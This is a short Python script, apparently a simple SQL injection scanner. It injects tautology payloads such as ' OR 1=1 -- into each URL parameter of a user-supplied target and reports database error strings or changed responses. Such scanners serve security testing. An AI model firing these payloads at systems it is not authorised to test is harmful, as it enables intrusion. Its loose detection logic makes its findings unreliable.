import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Payloads
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1"
]

def get_response(url):
    try:
        return requests.get(url, timeout=5).text
    except:
        return ""

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # inject into specific parameter
    params[param] = params[param][0] + payload

    new_query = urlencode(params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    return new_url

def scan_sql_injection(url):
    print(f"\n[+] Scanning: {url}\n")

    sql_errors = [
        "sql syntax",
        "mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated"
    ]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    found = False
    original_response = get_response(url)

    for param in params:
        print(f"\n[*] Testing parameter: {param}")

        for payload in payloads:
            test_url = inject_payload(url, param, payload)
            print(f"    → Payload: {payload}")

            injected_response = get_response(test_url)

        # Error-based detection
            for error in sql_errors:
                if error in injected_response.lower():
                    print(f"\n[VULNERABLE] SQL Injection detected via error!")
                    print(f"[PARAMETER] {param}")
                    print(f"[PAYLOAD] {payload}")
                    found = True
                    break

            if found:
                break
            
        # Response difference detection
            if injected_response != original_response:
                print(f"\n[POSSIBLE VULNERABILITY] Response changed!")
                print(f"[PARAMETER] {param}")
                print(f"[PAYLOAD] {payload}")
                found = True

    # continue scanning other params
        if found:
            continue

    if not found:
        print("\n[SAFE] No SQL Injection detected") 


if __name__ == "__main__":
    target = input("Enter URL (with parameters): ")
    scan_sql_injection(target)